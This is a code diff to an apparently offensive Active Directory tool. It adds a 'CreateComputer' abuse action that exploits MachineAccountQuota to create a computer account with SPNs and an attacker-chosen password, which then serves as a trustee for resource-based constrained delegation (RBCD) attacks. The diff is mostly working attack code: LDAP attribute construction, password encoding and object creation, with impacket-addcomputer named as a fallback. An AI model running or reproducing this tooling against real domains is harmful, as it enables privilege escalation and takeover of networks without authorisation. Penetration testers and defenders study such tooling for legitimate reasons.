@@ -71,6 +71,22 @@ pub(crate) enum AbuseAction {
     /// or (cleaner) `Collector::modify_replace` the attribute back to empty via an LDAP
     /// tool that supports Delete (adhammer's collector currently exposes Replace only).
     AllowedToAct,
+    /// CreateComputer: bootstrap an RBCD trustee by adding a computer account
+    /// via MachineAccountQuota (default: 10 per authenticated user). Any
+    /// account with an SPN is a valid trustee; new computers have HOST/*
+    /// and RestrictedKrbHost/* SPNs auto-registered by AD on creation.
+    ///
+    /// `--target <NAME>` is the sAMAccountName WITHOUT the trailing `$` (adhammer
+    /// adds it). `--value <password>` (or `env:VAR` / `@file:PATH`) sets the
+    /// computer's password so the trustee is usable in `attack rbcd`. The new
+    /// object lands under `CN=Computers,<domain-DN>` (the default computers
+    /// container — customizing the OU is a follow-up flag).
+    ///
+    /// Requires: the bind identity's `ms-DS-MachineAccountQuota` isn't zero
+    /// (0 is the AD hardening default in modern deployments; if it's zero this
+    /// action fails with `INSUFF_ACCESS_RIGHTS` and the operator must fall back
+    /// to `impacket-addcomputer` from a session with higher rights).
+    CreateComputer,
     /// SetUacFlags: OR-in one or more UAC bits on --target's userAccountControl.
     ///
     /// Common bits (all uppercase, comma-separated in --value):
@@ -431,6 +447,78 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
             }
             c.modify_replace(&target_dn, "gPLink", &combined).await?;
             println!("[+] linked GPO {} to OU {}", guid, target_dn);
+        }
+        AbuseAction::CreateComputer => {
+            // Stream 7 / machine-add via LDAP: MachineAccountQuota bootstrap.
+            // Add a fresh computer object under CN=Computers so RBCD chains
+            // have a valid trustee (any account with an SPN qualifies; the
+            // schema auto-registers HOST/* and RestrictedKrbHost/* on
+            // creation). Password comes from --value (env:/@file: expansion
+            // routed through resolve_secret).
+            let name = a.target.trim_end_matches('$');
+            if name.is_empty()
+                || !name
+                    .chars()
+                    .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
+            {
+                anyhow::bail!(
+                    "--target must be a bare sAMAccountName (letters/digits/-/_ only, no `$`)"
+                );
+            }
+            let pw_secret = crate::resolve_secret(a.value.as_str(), "ADHAMMER_PASSWORD")?;
+            if pw_secret.is_empty() {
+                anyhow::bail!("--value <password> required (env:/@file: supported)");
+            }
+            let domain = c.base_dn().to_string();
+            let dns_suffix: String = domain
+                .split(',')
+                .filter_map(|p| p.strip_prefix("DC="))
+                .collect::<Vec<_>>()
+                .join(".");
+            let sam = format!("{name}$");
+            let dn = format!("CN={name},CN=Computers,{domain}");
+            let dns_host = format!("{}.{dns_suffix}", name.to_lowercase());
+            // AD wants unicodePwd as UTF-16LE of the password wrapped in
+            // double-quotes. Same encoding SetPassword uses.
+            let quoted = format!("\"{}\"", pw_secret.expose_secret());
+            let unicode_pwd: Vec<u8> = quoted.encode_utf16().flat_map(u16::to_le_bytes).collect();
+            let attrs: Vec<(&str, Vec<Vec<u8>>)> = vec![
+                (
+                    "objectClass",
+                    vec![
+                        b"top".to_vec(),
+                        b"person".to_vec(),
+                        b"organizationalPerson".to_vec(),
+                        b"user".to_vec(),
+                        b"computer".to_vec(),
+                    ],
+                ),
+                ("sAMAccountName", vec![sam.as_bytes().to_vec()]),
+                ("dNSHostName", vec![dns_host.as_bytes().to_vec()]),
+                // 0x1000 = WORKSTATION_TRUST_ACCOUNT (RBCD-eligible)
+                ("userAccountControl", vec![b"4096".to_vec()]),
+                (
+                    "servicePrincipalName",
+                    vec![
+                        format!("HOST/{dns_host}").into_bytes(),
+                        format!("HOST/{name}").into_bytes(),
+                        format!("RestrictedKrbHost/{dns_host}").into_bytes(),
+                        format!("RestrictedKrbHost/{name}").into_bytes(),
+                    ],
+                ),
+                ("unicodePwd", vec![unicode_pwd]),
+            ];
+            if dry_run {
+                println!("[dry-run] would add {dn} (sAM={sam}, host={dns_host})");
+                return Ok(());
+            }
+            c.add_object(&dn, attrs).await.with_context(|| {
+                format!(
+                    "add computer {sam}: check MachineAccountQuota on the bind identity \
+                     (0 = disabled by policy → falls back to impacket-addcomputer)"
+                )
+            })?;
+            println!("[+] created computer {sam} — trustee ready for RBCD (dn={dn})");
         }
         AbuseAction::Pkinit => unreachable!("pkinit handled above the LDAP-connect block"),
     }
